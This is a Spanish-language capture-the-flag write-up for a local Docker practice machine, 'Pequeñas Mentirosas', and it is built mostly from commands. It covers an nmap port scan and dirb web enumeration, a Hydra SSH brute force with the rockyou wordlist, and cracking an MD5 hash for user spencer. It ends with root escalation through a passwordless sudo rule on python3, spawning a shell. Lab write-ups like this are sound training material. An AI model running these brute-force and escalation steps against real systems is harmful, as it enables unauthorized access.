
# 🕵️‍♀️ CTF - Pequeñas Mentirosas

Máquina de práctica desplegada con Docker. Esta guía documenta el proceso de enumeración, explotación y escalada de privilegios.

---

## 🔧 Paso 1: Despliegue

La máquina fue desplegada localmente usando un script `auto_deploy.sh`, asignándole la IP `172.17.0.2`.

```bash
sudo bash auto_deploy.sh pequenas-mentirosas.tar
```

---

## 🔍 Paso 2: Escaneo con Nmap

```bash
nmap -sV -min-rate 1000 -T4 -p- -Pn 172.17.0.2
```

### Puertos abiertos:

- **22/tcp** → SSH
- **80/tcp** → HTTP (Apache)

---

## 🌐 Paso 3: Enumeración Web

Se visitó `http://172.17.0.2/` y se encontró un mensaje:

> “La clave para A está en los archivos.”

Se analizaron:
- `index.html` (nada relevante)
- `/server-status` (acceso 403)

También se ejecutó **DIRB** para descubrir rutas:

```bash
dirb http://172.17.0.2/ /usr/share/dirb/wordlists/common.txt
```

---

## 🔑 Paso 4: Fuerza Bruta SSH

Se asumió que el usuario era `a`. Se ejecutó Hydra:

```bash
hydra -l a -P /usr/share/wordlists/rockyou.txt 172.17.0.2 ssh -t 6
```

🎯 **Credenciales encontradas:**
- Usuario: `a`
- Contraseña: `secret`

---

## 🐚 Paso 5: Acceso SSH como usuario `a`

```bash
ssh a@172.17.0.2
```

Se verificó que **no tiene privilegios de `sudo`**.

---

## 📂 Paso 6: Enumeración Interna

```bash
find / -name *.txt -perm -4000 2>/dev/null
```

Archivos interesantes:
- `/srv/ftp/hash_spencer.txt`
- `/srv/ftp/pista_fuerza_bruta.txt`
- `/srv/ftp/retos_asimetrico.txt`
- `/srv/ftp/original_a.txt`
- `/srv/ftp/clave_aes.txt`

---

## 🔓 Paso 7: Encontrar y crackear hash MD5

En uno de los archivos apareció un hash MD5 del usuario `spencer`.

El hash fue crackeado con **CrackStation** y se obtuvo la contraseña.

---

## 🐧 Paso 8: SSH como Spencer

```bash
ssh spencer@172.17.0.2
```

Se verifica que tiene permisos de `sudo` sobre `python3` sin contraseña:

```bash
sudo -l
# (ALL) NOPASSWD: /usr/bin/python3
```

---

## 📈 Paso 9: Escalada de privilegios

Se usó GTFOBins para ejecutar una shell como root con Python:

```bash
sudo python3 -c 'import os; os.system("/bin/sh")'
whoami
# root
```

--
